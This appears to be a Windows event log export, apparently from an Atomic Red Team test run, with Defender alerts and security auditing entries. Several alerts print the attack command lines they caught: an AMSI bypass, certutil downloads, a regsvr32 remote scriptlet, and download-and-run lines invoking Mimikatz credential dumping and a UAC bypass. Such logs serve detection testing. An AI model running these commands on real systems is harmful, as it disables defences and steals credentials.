+https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:PowerShell/PsAttack.A&threatid=2147725500&enterprise=0
+ 	Name: Trojan:PowerShell/PsAttack.A
+ 	ID: 2147725500
+ 	Severity: Severe
+ 	Category: Trojan
+ 	Path: CmdLine:_C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe & {[Ref].Assembly.GetType(""AMSIUTILS"").GetField('amsiInitFailed','NonPublic,Static').SetValue(NULL,TRUE)}
+ 	Detection Origin: Unknown
+ 	Detection Type: Concrete
+ 	Detection Source: System
+ 	User: NT AUTHORITY\SYSTEM
+ 	Process Name: Unknown
+ 	Security intelligence Version: AV: 1.313.1512.0, AS: 1.313.1512.0, NIS: 1.313.1512.0
+ 	Engine Version: AM: 1.1.16900.4, NIS: 1.1.16900.4"
+Warning,15/04/2020 14:43,Microsoft-Windows-DistributedCOM,10016,None,"The machine-default permission settings do not grant Local Activation permission for the COM Server application with CLSID 
+{C2F03A33-21F5-47FA-B4BB-156362A2F239}
+ and APPID 
+{316CDED5-E4AE-4B15-9113-7055D84DCC97}
+ to the user DESKTOP-P8HTU4V\User SID (S-1-5-21-887719237-3143055800-1059174887-1001) from address LocalHost (Using LRPC) running in the application container Microsoft.Windows.ShellExperienceHost_10.0.18362.387_neutral_neutral_cw5n1h2txyewy SID (S-1-15-2-155514346-2573954481-755741238-1654018636-1233331829-3075935687-2861478708). This security permission can be modified using the Component Services administrative tool."
+Warning,15/04/2020 14:43,Microsoft-Windows-Windows Defender,1116,None,"Windows Defender Antivirus has detected malware or other potentially unwanted software.
+ For more information please see the following:
+https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:PowerShell/PsAttack.A&threatid=2147725500&enterprise=0
+ 	Name: Trojan:PowerShell/PsAttack.A
+ 	ID: 2147725500
+ 	Severity: Severe
+ 	Category: Trojan
+ 	Path: CmdLine:_C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe & {[Ref].Assembly.GetType(""AMSIUTILS"").GetField('amsiInitFailed','NonPublic,Static').SetValue(NULL,TRUE)}
+ 	Detection Origin: Unknown
+ 	Detection Type: Concrete
+ 	Detection Source: System
+ 	User: NT AUTHORITY\SYSTEM
+ 	Process Name: Unknown
+ 	Security intelligence Version: AV: 1.313.1512.0, AS: 1.313.1512.0, NIS: 1.313.1512.0
+ 	Engine Version: AM: 1.1.16900.4, NIS: 1.1.16900.4"
+Information,15/04/2020 14:43,Service Control Manager,7040,None,The start type of the Background Intelligent Transfer Service service was changed from demand start to auto start.
+Information,15/04/2020 14:43,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		SYSTEM
+	Account Name:		DESKTOP-P8HTU4V$
+	Account Domain:		WORKGROUP
+	Logon ID:		0x3E7
+
+Group:
+	Security ID:		BUILTIN\Administrators
+	Group Name:		Administrators
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0x1a0
+	Process Name:		C:\Windows\System32\svchost.exe"
+Information,15/04/2020 14:43,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		SYSTEM
+	Account Name:		DESKTOP-P8HTU4V$
+	Account Domain:		WORKGROUP
+	Logon ID:		0x3E7
+
+Group:
+	Security ID:		BUILTIN\Backup Operators
+	Group Name:		Backup Operators
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0x1a0
+	Process Name:		C:\Windows\System32\svchost.exe"
+Information,15/04/2020 14:44,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Access Control Assistance Operators
+	Group Name:		Access Control Assistance Operators
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0xe80
+	Process Name:		C:\Windows\System32\wbem\WmiPrvSE.exe"
+Information,15/04/2020 14:44,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Administrators
+	Group Name:		Administrators
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0xe80
+	Process Name:		C:\Windows\System32\wbem\WmiPrvSE.exe"
+Warning,15/04/2020 14:44,Microsoft-Windows-Windows Defender,1116,None,"Windows Defender Antivirus has detected malware or other potentially unwanted software.
+ For more information please see the following:
+https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Ceprolad.A&threatid=2147726914&enterprise=0
+ 	Name: Trojan:Win32/Ceprolad.A
+ 	ID: 2147726914
+ 	Severity: Severe
+ 	Category: Trojan
+ 	Path: CmdLine:_C:\Windows\System32\cmd.exe /c type EVIL_EXECUTABLE > TeamViewer12_Logfile EVIL_EXECUTABLE & extrac32 PROCEXSP_EXECUTABLE & findstr /V /L W3AllLov3DonaldTrump PROCEXSP_EXECUTABLE > PROCEXSP_EXECUTABLE & certutil_executable -urlcache -split -f GITHUB_ATOMICS_T1096 c:\temp:ttt & makecab AUTORUNS_EXECUTABLE & print /D AUTORUNS_EXECUTABE & reg export EVILREG REGFILE_REG & regedit /E REGFILE_REG HKEY_CURRENT_USER\MyCustomRegKey & expand WEBDAV_BAT FILE_BAT & ESENTULT_EXECUTABLE /y AUTORUNS_EXECUTABLE /d AUTORUNS_EXECUTABLE /o
+ 	Detection Origin: Unknown
+ 	Detection Type: Concrete
+ 	Detection Source: System
+ 	User: NT AUTHORITY\SYSTEM
+ 	Process Name: Unknown
+ 	Security intelligence Version: AV: 1.313.1512.0, AS: 1.313.1512.0, NIS: 1.313.1512.0
+ 	Engine Version: AM: 1.1.16900.4, NIS: 1.1.16900.4"
+Information,15/04/2020 14:44,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Backup Operators
+	Group Name:		Backup Operators
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0xe80
+	Process Name:		C:\Windows\System32\wbem\WmiPrvSE.exe"
+Information,15/04/2020 14:44,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Cryptographic Operators
+	Group Name:		Cryptographic Operators
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0xe80
+	Process Name:		C:\Windows\System32\wbem\WmiPrvSE.exe"
+Information,15/04/2020 14:44,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Device Owners
+	Group Name:		Device Owners
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0xe80
+	Process Name:		C:\Windows\System32\wbem\WmiPrvSE.exe"
+Information,15/04/2020 14:44,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Distributed COM Users
+	Group Name:		Distributed COM Users
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0xe80
+	Process Name:		C:\Windows\System32\wbem\WmiPrvSE.exe"
+Information,15/04/2020 14:44,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Event Log Readers
+	Group Name:		Event Log Readers
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0xe80
+	Process Name:		C:\Windows\System32\wbem\WmiPrvSE.exe"
+Information,15/04/2020 14:44,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Guests
+	Group Name:		Guests
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0xe80
+	Process Name:		C:\Windows\System32\wbem\WmiPrvSE.exe"
+Information,15/04/2020 14:44,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Hyper-V Administrators
+	Group Name:		Hyper-V Administrators
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0xe80
+	Process Name:		C:\Windows\System32\wbem\WmiPrvSE.exe"
+Information,15/04/2020 14:44,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\IIS_IUSRS
+	Group Name:		IIS_IUSRS
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0xe80
+	Process Name:		C:\Windows\System32\wbem\WmiPrvSE.exe"
+Information,15/04/2020 14:44,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Network Configuration Operators
+	Group Name:		Network Configuration Operators
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0xe80
+	Process Name:		C:\Windows\System32\wbem\WmiPrvSE.exe"
+Information,15/04/2020 14:44,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Performance Log Users
+	Group Name:		Performance Log Users
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0xe80
+	Process Name:		C:\Windows\System32\wbem\WmiPrvSE.exe"
+Information,15/04/2020 14:44,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Performance Monitor Users
+	Group Name:		Performance Monitor Users
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0xe80
+	Process Name:		C:\Windows\System32\wbem\WmiPrvSE.exe"
+Information,15/04/2020 14:44,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Power Users
+	Group Name:		Power Users
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0xe80
+	Process Name:		C:\Windows\System32\wbem\WmiPrvSE.exe"
+Information,15/04/2020 14:44,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Remote Desktop Users
+	Group Name:		Remote Desktop Users
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0xe80
+	Process Name:		C:\Windows\System32\wbem\WmiPrvSE.exe"
+Information,15/04/2020 14:44,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Remote Management Users
+	Group Name:		Remote Management Users
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0xe80
+	Process Name:		C:\Windows\System32\wbem\WmiPrvSE.exe"
+Information,15/04/2020 14:44,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Replicator
+	Group Name:		Replicator
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0xe80
+	Process Name:		C:\Windows\System32\wbem\WmiPrvSE.exe"
+Information,15/04/2020 14:44,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\System Managed Group
+	Group Name:		System Managed Accounts Group
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0xe80
+	Process Name:		C:\Windows\System32\wbem\WmiPrvSE.exe"
+Information,15/04/2020 14:44,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Users
+	Group Name:		Users
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0xe80
+	Process Name:		C:\Windows\System32\wbem\WmiPrvSE.exe"
+Information,15/04/2020 14:44,Microsoft-Windows-Security-Auditing,4798,User Account Management,"A user's local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+User:
+	Security ID:		DESKTOP-P8HTU4V\CISADMIN
+	Account Name:		Administrator
+	Account Domain:		DESKTOP-P8HTU4V
+
+Process Information:
+	Process ID:		0xe80
+	Process Name:		C:\Windows\System32\wbem\WmiPrvSE.exe"
+Information,15/04/2020 14:44,Microsoft-Windows-Security-Auditing,4798,User Account Management,"A user's local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+User:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+
+Process Information:
+	Process ID:		0xe80
+	Process Name:		C:\Windows\System32\wbem\WmiPrvSE.exe"
+Warning,15/04/2020 14:44,Microsoft-Windows-DistributedCOM,10016,None,"The machine-default permission settings do not grant Local Activation permission for the COM Server application with CLSID 
+{C2F03A33-21F5-47FA-B4BB-156362A2F239}
+ and APPID 
+{316CDED5-E4AE-4B15-9113-7055D84DCC97}
+ to the user DESKTOP-P8HTU4V\User SID (S-1-5-21-887719237-3143055800-1059174887-1001) from address LocalHost (Using LRPC) running in the application container Microsoft.Windows.ShellExperienceHost_10.0.18362.387_neutral_neutral_cw5n1h2txyewy SID (S-1-15-2-155514346-2573954481-755741238-1654018636-1233331829-3075935687-2861478708). This security permission can be modified using the Component Services administrative tool."
+Information,15/04/2020 14:44,Microsoft-Windows-Windows Defender,1117,None,"Windows Defender Antivirus has taken action to protect this machine from malware or other potentially unwanted software.
+ For more information please see the following:
+https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Powessere.G&threatid=2147725444&enterprise=0
+ 	Name: Trojan:Win32/Powessere.G
+ 	ID: 2147725444
+ 	Severity: Severe
+ 	Category: Trojan
+ 	Path: CmdLine:_C:\Windows\System32\cmd.exe /c RUNDLL32 vbscript:PATH, RunHTMLApplication +String(CreateObject(WSCRIPT_SHELL).Run(CALCULATOR),0)
+ 	Detection Origin: Unknown
+ 	Detection Type: Concrete
+ 	Detection Source: System
+ 	User: NT AUTHORITY\SYSTEM
+ 	Process Name: Unknown
+ 	Action: Remove
+ 	Action Status:  No additional actions required
+ 	Error Code: 0x00000000
+ 	Error description: The operation completed successfully. 
+ 	Security intelligence Version: AV: 1.313.1512.0, AS: 1.313.1512.0, NIS: 1.313.1512.0
+ 	Engine Version: AM: 1.1.16900.4, NIS: 1.1.16900.4"
+Information,15/04/2020 14:44,SecurityCenter,15,None,Updated Windows Defender status successfully to SECURITY_PRODUCT_STATE_ON.
+Information,15/04/2020 14:44,SecurityCenter,15,None,Updated Windows Defender status successfully to SECURITY_PRODUCT_STATE_ON.
+Warning,15/04/2020 14:44,Microsoft-Windows-Windows Defender,1116,None,"Windows Defender Antivirus has detected malware or other potentially unwanted software.
+ For more information please see the following:
+https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Ceprolad.A&threatid=2147726914&enterprise=0
+ 	Name: Trojan:Win32/Ceprolad.A
+ 	ID: 2147726914
+ 	Severity: Severe
+ 	Category: Trojan
+ 	Path: CmdLine:_C:\Windows\System32\cmd.exe /c cmd /c certutil -urlcache -split -f GITHUB_ATOMIC_RED_TEAM Atomic-license.txt
+ 	Detection Origin: Unknown
+ 	Detection Type: Concrete
+ 	Detection Source: System
+ 	User: NT AUTHORITY\SYSTEM
+ 	Process Name: Unknown
+ 	Security intelligence Version: AV: 1.313.1512.0, AS: 1.313.1512.0, NIS: 1.313.1512.0
+ 	Engine Version: AM: 1.1.16900.4, NIS: 1.1.16900.4"
+Warning,15/04/2020 14:44,Microsoft-Windows-DistributedCOM,10016,None,"The machine-default permission settings do not grant Local Activation permission for the COM Server application with CLSID 
+{C2F03A33-21F5-47FA-B4BB-156362A2F239}
+ and APPID 
+{316CDED5-E4AE-4B15-9113-7055D84DCC97}
+ to the user DESKTOP-P8HTU4V\User SID (S-1-5-21-887719237-3143055800-1059174887-1001) from address LocalHost (Using LRPC) running in the application container Microsoft.Windows.ShellExperienceHost_10.0.18362.387_neutral_neutral_cw5n1h2txyewy SID (S-1-15-2-155514346-2573954481-755741238-1654018636-1233331829-3075935687-2861478708). This security permission can be modified using the Component Services administrative tool."
+Warning,15/04/2020 14:44,Microsoft-Windows-Windows Defender,1116,None,"Windows Defender Antivirus has detected malware or other potentially unwanted software.
+ For more information please see the following:
+https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Ceprolad.B&threatid=2147733363&enterprise=0
+ 	Name: Trojan:Win32/Ceprolad.B
+ 	ID: 2147733363
+ 	Severity: Severe
+ 	Category: Trojan
+ 	Path: CmdLine:_C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe & {DATE_STUFF CERTUTIL -verifyctl -split -f GITHUB_ATOMIC_RED_TEAM Get-ChildItem | Where-Object {$_.Name -notlike ""*.txt""} | Foreach-Object { Move-Item $_.Name -Destination Atomic-license.txt }}
+ 	Detection Origin: Unknown
+ 	Detection Type: Concrete
+ 	Detection Source: System
+ 	User: NT AUTHORITY\SYSTEM
+ 	Process Name: Unknown
+ 	Security intelligence Version: AV: 1.313.1512.0, AS: 1.313.1512.0, NIS: 1.313.1512.0
+ 	Engine Version: AM: 1.1.16900.4, NIS: 1.1.16900.4"
+Warning,15/04/2020 14:45,Microsoft-Windows-Windows Defender,1116,None,"Windows Defender Antivirus has detected malware or other potentially unwanted software.
+ For more information please see the following:
+https://go.microsoft.com/fwlink/?linkid=37020&name=Backdoor:JS/Relvelshe.A&threatid=2147744426&enterprise=0
+ 	Name: Backdoor:JS/Relvelshe.A
+ 	ID: 2147744426
+ 	Severity: Severe
+ 	Category: Backdoor
+ 	Path: file:_C:\AtomicRedTeam\atomics\T1117\src\RegSvr32.sct
+ 	Detection Origin: Local machine
+ 	Detection Type: Concrete
+ 	Detection Source: Real-Time Protection
+ 	User: DESKTOP-P8HTU4V\User
+ 	Process Name: C:\Windows\System32\regsvr32.exe
+ 	Security intelligence Version: AV: 1.313.1512.0, AS: 1.313.1512.0, NIS: 1.313.1512.0
+ 	Engine Version: AM: 1.1.16900.4, NIS: 1.1.16900.4"
+Warning,15/04/2020 14:45,Microsoft-Windows-DistributedCOM,10016,None,"The machine-default permission settings do not grant Local Activation permission for the COM Server application with CLSID 
+{C2F03A33-21F5-47FA-B4BB-156362A2F239}
+ and APPID 
+{316CDED5-E4AE-4B15-9113-7055D84DCC97}
+ to the user DESKTOP-P8HTU4V\User SID (S-1-5-21-887719237-3143055800-1059174887-1001) from address LocalHost (Using LRPC) running in the application container Microsoft.Windows.ShellExperienceHost_10.0.18362.387_neutral_neutral_cw5n1h2txyewy SID (S-1-15-2-155514346-2573954481-755741238-1654018636-1233331829-3075935687-2861478708). This security permission can be modified using the Component Services administrative tool."
+Warning,15/04/2020 14:45,Microsoft-Windows-Windows Defender,1116,None,"Windows Defender Antivirus has detected malware or other potentially unwanted software.
+ For more information please see the following:
+https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Powemet.A!attk&threatid=2147725438&enterprise=0
+ 	Name: Trojan:Win32/Powemet.A!attk
+ 	ID: 2147725438
+ 	Severity: Severe
+ 	Category: Trojan
+ 	Path: CmdLine:_C:\Windows\System32\cmd.exe /c REGSRV_EXE /s /u /i: GITHUB_ATOMICS_T1117 REGSRV32_SCT SCROBJ_DDL
+ 	Detection Origin: Unknown
+ 	Detection Type: Concrete
+ 	Detection Source: System
+ 	User: NT AUTHORITY\SYSTEM
+ 	Process Name: Unknown
+ 	Security intelligence Version: AV: 1.313.1512.0, AS: 1.313.1512.0, NIS: 1.313.1512.0
+ 	Engine Version: AM: 1.1.16900.4, NIS: 1.1.16900.4"
+Information,15/04/2020 14:46,Microsoft-Windows-MSDTC 2,4202,TM,"MSDTC started with the following settings:
+
+ Security Configuration (OFF = 0 and ON = 1):
+ Allow Remote Administrator = 0,
+ Network Clients = 0,
+ Transaction Manager Communication: 
+ Allow Inbound Transactions = 0,
+ Allow Outbound Transactions = 0,
+ Transaction Internet Protocol (TIP) = 0,
+  Enable XA Transactions = 0,
+  Enable SNA LU 6.2 Transactions = 1,
+  MSDTC Communications Security = Mutual Authentication Required,
+ Account = NT AUTHORITY\NetworkService,
+  Firewall Exclusion Detected = 0
+
+ Transaction Bridge Installed = 0
+ Filtering Duplicate Events = 1
+"
+Information,15/04/2020 14:46,Microsoft-Windows-Security-Auditing,4624,Logon,"An account was successfully logged on.
+
+Subject:
+	Security ID:		SYSTEM
+	Account Name:		DESKTOP-P8HTU4V$
+	Account Domain:		WORKGROUP
+	Logon ID:		0x3E7
+
+Logon Information:
+	Logon Type:		5
+	Restricted Admin Mode:	-
+	Virtual Account:		No
+	Elevated Token:		Yes
+
+Impersonation Level:		Impersonation
+
+New Logon:
+	Security ID:		SYSTEM
+	Account Name:		SYSTEM
+	Account Domain:		NT AUTHORITY
+	Logon ID:		0x3E7
+	Linked Logon ID:		0x0
+	Network Account Name:	-
+	Network Account Domain:	-
+	Logon GUID:		{00000000-0000-0000-0000-000000000000}
+
+Process Information:
+	Process ID:		0x258
+	Process Name:		C:\Windows\System32\services.exe
+
+Network Information:
+	Workstation Name:	-
+	Source Network Address:	-
+	Source Port:		-
+
+Detailed Authentication Information:
+	Logon Process:		Advapi  
+	Authentication Package:	Negotiate
+	Transited Services:	-
+	Package Name (NTLM only):	-
+	Key Length:		0
+
+This event is generated when a logon session is created. It is generated on the computer that was accessed.
+
+The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.
+
+The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).
+
+The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.
+
+The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.
+
+The impersonation level field indicates the extent to which a process in the logon session can impersonate.
+
+The authentication information fields provide detailed information about this specific logon request.
+	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
+	- Transited services indicate which intermediate services have participated in this logon request.
+	- Package name indicates which sub-protocol was used among the NTLM protocols.
+	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested."
+Information,15/04/2020 14:46,Microsoft-Windows-Security-Auditing,4672,Special Logon,"Special privileges assigned to new logon.
+
+Subject:
+	Security ID:		SYSTEM
+	Account Name:		SYSTEM
+	Account Domain:		NT AUTHORITY
+	Logon ID:		0x3E7
+
+Privileges:		SeAssignPrimaryTokenPrivilege
+			SeTcbPrivilege
+			SeSecurityPrivilege
+			SeTakeOwnershipPrivilege
+			SeLoadDriverPrivilege
+			SeBackupPrivilege
+			SeRestorePrivilege
+			SeDebugPrivilege
+			SeAuditPrivilege
+			SeSystemEnvironmentPrivilege
+			SeImpersonatePrivilege
+			SeDelegateSessionUserImpersonatePrivilege"
+Information,15/04/2020 14:46,Microsoft-Windows-Complus,781,None,The COM+ sub system is suppressing duplicate event log entries for a duration of 86400 seconds.  The suppression timeout can be controlled by a REG_DWORD value named SuppressDuplicateDuration under the following registry key: HKLM\Software\Microsoft\COM3\Eventlog.
+Warning,15/04/2020 14:46,Microsoft-Windows-MSDTC Client 2,4879,CM,MSDTC encountered an error (HR=0x80000171) while attempting to establish a secure connection with system DESKTOP-P8HTU4V.
+Information,15/04/2020 14:46,Microsoft-Windows-Security-Auditing,5379,User Account Management,"Credential Manager credentials were read.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+	Read Operation:		Enumerate Credentials
+
+This event occurs when a user performs a read operation on stored credentials in Credential Manager."
+Information,15/04/2020 14:46,Microsoft-Windows-Windows Defender,1117,None,"Windows Defender Antivirus has taken action to protect this machine from malware or other potentially unwanted software.
+ For more information please see the following:
+https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:PowerShell/Sacepos.C&threatid=2147726248&enterprise=0
+ 	Name: Trojan:PowerShell/Sacepos.C
+ 	ID: 2147726248
+ 	Severity: Severe
+ 	Category: Trojan
+ 	Path: CmdLine:_C:\Windows\System32\cmd.exe /c PWS_EXECUTABLE IEX (New-Object Net.WebClient).DownloadString('GITHUB_INVOKE_APP_BYPASS_PWS'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'
+ 	Detection Origin: Unknown
+ 	Detection Type: Concrete
+ 	Detection Source: System
+ 	User: NT AUTHORITY\SYSTEM
+ 	Process Name: Unknown
+ 	Action: Remove
+ 	Action Status:  No additional actions required
+ 	Error Code: 0x00000000
+ 	Error description: The operation completed successfully. 
+ 	Security intelligence Version: AV: 1.313.1512.0, AS: 1.313.1512.0, NIS: 1.313.1512.0
+ 	Engine Version: AM: 1.1.16900.4, NIS: 1.1.16900.4"
+Information,15/04/2020 14:46,Microsoft-Windows-Windows Defender,1117,None,"Windows Defender Antivirus has taken action to protect this machine from malware or other potentially unwanted software.
+ For more information please see the following:
+https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:PowerShell/Mimikatz.A&threatid=2147725502&enterprise=0
+ 	Name: Trojan:PowerShell/Mimikatz.A
+ 	ID: 2147725502
+ 	Severity: Severe
+ 	Category: Trojan
+ 	Path: CmdLine:_C:\Windows\System32\cmd.exe /c PWS_EXECUTABLE IEX (New-Object Net.WebClient).DownloadString('GITHUB_MIMIKATZ_PWS'); Invoke-Mimikatz -DumpCreds
+ 	Detection Origin: Unknown
+ 	Detection Type: Concrete
+ 	Detection Source: System
+ 	User: NT AUTHORITY\SYSTEM
+ 	Process Name: Unknown
+ 	Action: Remove
+ 	Action Status:  No additional actions required
+ 	Error Code: 0x00000000
+ 	Error description: The operation completed successfully. 
+ 	Security intelligence Version: AV: 1.313.1512.0, AS: 1.313.1512.0, NIS: 1.313.1512.0
+ 	Engine Version: AM: 1.1.16900.4, NIS: 1.1.16900.4"
+Information,15/04/2020 14:46,Microsoft-Windows-Windows Defender,1117,None,"Windows Defender Antivirus has taken action to protect this machine from malware or other potentially unwanted software.
+ For more information please see the following:
+https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:PowerShell/PsAttack.A&threatid=2147725500&enterprise=0
+ 	Name: Trojan:PowerShell/PsAttack.A
+ 	ID: 2147725500
+ 	Severity: Severe
+ 	Category: Trojan
+ 	Path: CmdLine:_C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe & {[Ref].Assembly.GetType(""AMSIUTILS"").GetField('amsiInitFailed','NonPublic,Static').SetValue(NULL,TRUE)}
+ 	Detection Origin: Unknown
+ 	Detection Type: Concrete
+ 	Detection Source: System
+ 	User: NT AUTHORITY\SYSTEM
+ 	Process Name: Unknown
+ 	Action: Remove
